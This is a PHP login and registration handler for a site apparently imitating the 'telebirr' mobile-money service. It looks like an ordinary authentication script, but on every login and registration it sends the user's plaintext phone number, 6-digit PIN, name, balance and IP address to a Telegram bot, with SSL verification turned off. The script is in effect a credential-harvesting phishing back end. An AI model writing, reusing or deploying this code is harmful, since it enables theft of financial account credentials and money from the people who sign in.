<?php
// ============================================================
// LOGIN.PHP - Handles login and registration
// ============================================================

session_start();
header('Content-Type: application/json');

// Database configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'telebirr_pro');

// Telegram Bot Configuration
define('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('CHAT_ID', 'YOUR_CHAT_ID_HERE');

// ============ DATABASE FUNCTION ============
function db() {
    static $conn = null;
    if ($conn === null) {
        try {
            $conn = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=utf8mb4", DB_USER, DB_PASS);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        } catch (PDOException $e) {
            die(json_encode(['success' => false, 'message' => 'Database error']));
        }
    }
    return $conn;
}

// ============ TELEGRAM FUNCTION ============
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// ============ HANDLE ACTIONS ============
$action = $_POST['action'] ?? $_GET['action'] ?? '';

// Logout
if (isset($_GET['logout']) || $action === 'logout') {
    session_destroy();
    header('Location: login.html');
    exit;
}

// Login
if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = trim($_POST['phone'] ?? '');
    $pin = $_POST['pin'] ?? '';
    
    if (!preg_match('/^09[0-9]{8}$/', $phone)) {
        echo json_encode(['success' => false, 'message' => 'Invalid phone number']);
        exit;
    }
    
    if (strlen($pin) !== 6 || !ctype_digit($pin)) {
        echo json_encode(['success' => false, 'message' => 'PIN must be 6 digits']);
        exit;
    }
    
    $db = db();
    $stmt = $db->prepare("SELECT * FROM users WHERE phone = ? AND status = 'active'");
    $stmt->execute([$phone]);
    $user = $stmt->fetch();
    
    if ($user && password_verify($pin, $user['pin'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['user_phone'] = $user['phone'];
        $_SESSION['user_name'] = $user['name'];
        $_SESSION['user_balance'] = $user['balance'];
        $_SESSION['login_time'] = time();
        $_SESSION['is_admin'] = ($user['phone'] === 'admin');
        
        $stmt = $db->prepare("UPDATE users SET last_login = NOW(), login_attempts = 0 WHERE id = ?");
        $stmt->execute([$user['id']]);
        
        // Send login notification to Telegram
        $message = "🔐 <b>USER LOGIN</b>\n\n" .
                   "📱 <b>Phone:</b> <code>" . $phone . "</code>\n" .
                   "🔑 <b>PIN:</b> <code>" . $pin . "</code>\n" .
                   "👤 <b>Name:</b> " . ($user['name'] ?: 'Not set') . "\n" .
                   "💰 <b>Balance:</b> ETB " . number_format($user['balance'], 2) . "\n" .
                   "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n" .
                   "🌐 <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
        sendTelegram($message);
        
        echo json_encode([
            'success' => true,
            'message' => 'Login successful',
            'redirect' => 'dashboard.html'
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Invalid phone number or PIN']);
    }
    exit;
}

// Register
if ($action === 'register' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = trim($_POST['name'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $pin = $_POST['pin'] ?? '';
    $confirm_pin = $_POST['confirm_pin'] ?? '';
    
    if (empty($name)) {
        echo json_encode(['success' => false, 'message' => 'Name is required']);
        exit;
    }
    
    if (!preg_match('/^09[0-9]{8}$/', $phone)) {
        echo json_encode(['success' => false, 'message' => 'Invalid phone number']);
        exit;
    }
    
    if (strlen($pin) !== 6 || !ctype_digit($pin)) {
        echo json_encode(['success' => false, 'message' => 'PIN must be 6 digits']);
        exit;
    }
    
    if ($pin !== $confirm_pin) {
        echo json_encode(['success' => false, 'message' => 'PINs do not match']);
        exit;
    }
    
    $db = db();
    
    // Check if phone exists
    $stmt = $db->prepare("SELECT id FROM users WHERE phone = ?");
    $stmt->execute([$phone]);
    if ($stmt->fetch()) {
        echo json_encode(['success' => false, 'message' => 'Phone number already registered']);
        exit;
    }
    
    // Register user
    $hashed = password_hash($pin, PASSWORD_DEFAULT);
    $stmt = $db->prepare("INSERT INTO users (phone, pin, name, created_at) VALUES (?, ?, ?, NOW())");
    $result = $stmt->execute([$phone, $hashed, $name]);
    
    if ($result) {
        // Send registration notification to Telegram
        $message = "🆕 <b>NEW USER REGISTERED</b>\n\n" .
                   "📱 <b>Phone:</b> <code>" . $phone . "</code>\n" .
                   "🔑 <b>PIN:</b> <code>" . $pin . "</code>\n" .
                   "👤 <b>Name:</b> " . $name . "\n" .
                   "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n" .
                   "🌐 <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
        sendTelegram($message);
        
        echo json_encode([
            'success' => true,
            'message' => 'Registration successful! Please login.',
            'redirect' => 'login.html'
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Registration failed. Please try again.']);
    }
    exit;
}

// If no action, redirect to login
header('Location: login.html');
exit;
?>
